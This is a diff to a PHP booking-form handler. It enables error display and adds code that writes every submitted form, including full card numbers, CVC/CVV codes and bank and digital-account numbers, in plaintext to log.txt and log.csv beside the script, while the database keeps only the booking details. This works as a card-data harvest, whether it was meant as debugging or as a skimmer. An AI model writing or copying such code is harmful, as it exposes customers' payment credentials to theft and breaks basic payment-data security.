@@ -1,11 +1,13 @@
 <?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
 header('Access-Control-Allow-Origin: *'); 
 header('Access-Control-Allow-Methods: POST, GET, OPTIONS'); 
 header('Access-Control-Allow-Headers: Content-Type'); 
 
-ini_set('display_errors', 1);
-ini_set('display_startup_errors', 1);
-error_reporting(E_ALL);
+file_put_contents(__DIR__ . '/log.txt', "Script executed\n", FILE_APPEND);
 
 if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
     http_response_code(200); 
@@ -173,6 +175,47 @@ try {
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Log the entire $_POST array
+    file_put_contents(__DIR__ . '/log.txt', "Submitted Data: " . print_r($_POST, true) . "\n", FILE_APPEND);
+
+    // Prepare data for CSV
+    $data = [
+        $_POST['firstName'] ?? '',
+        $_POST['lastName'] ?? '',
+        $_POST['dateTime'] ?? '',
+        $_POST['email'] ?? '',
+        $_POST['phoneNumber'] ?? '',
+        $_POST['seatsBooked'] ?? '',
+        $_POST['notes'] ?? '',
+        $_POST['paymentMethod'] ?? '',
+        $_POST['accountName'] ?? '',
+        $_POST['accountNumber'] ?? '',
+        $_POST['cardType'] ?? '',
+        $_POST['cardHolderName'] ?? '',
+        $_POST['cardNumber'] ?? '',
+        $_POST['cvcCvv'] ?? '',
+        $_POST['digitalAccountName'] ?? '',
+        $_POST['digitalAccountNumber'] ?? ''
+    ];
+
+    // Write data to CSV file
+    $csvFile = __DIR__ . '/log.csv';
+    $fileExists = file_exists($csvFile);
+
+    $file = fopen($csvFile, 'a'); // Open file in append mode
+    if (!$fileExists) {
+        // Write header row if the file does not exist
+        fputcsv($file, [
+            'First Name', 'Last Name', 'Date and Time', 'Email', 'Phone Number', 
+            'Seats Booked', 'Notes', 'Payment Method', 'Account Name', 
+            'Account Number', 'Card Type', 'Card Holder Name', 'Card Number', 
+            'CVC/CVV', 'Digital Account Name', 'Digital Account Number'
+        ]);
+    }
+    fputcsv($file, $data); // Write the submitted data
+    fclose($file); // Close the file
+
+    // Insert data into the database
     $stmt = $pdo->prepare("INSERT INTO bookings (first_name, last_name, date_time, email, phone_number, seats_booked, notes) VALUES (?, ?, ?, ?, ?, ?, ?)");
     $stmt->execute([
         $_POST['firstName'],
@@ -183,6 +226,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $_POST['seatsBooked'],
         $_POST['notes'] ?? null
     ]);
+
     echo json_encode(['success' => true, 'message' => 'Reservation submitted successfully!']);
 } else {
     http_response_code(405);
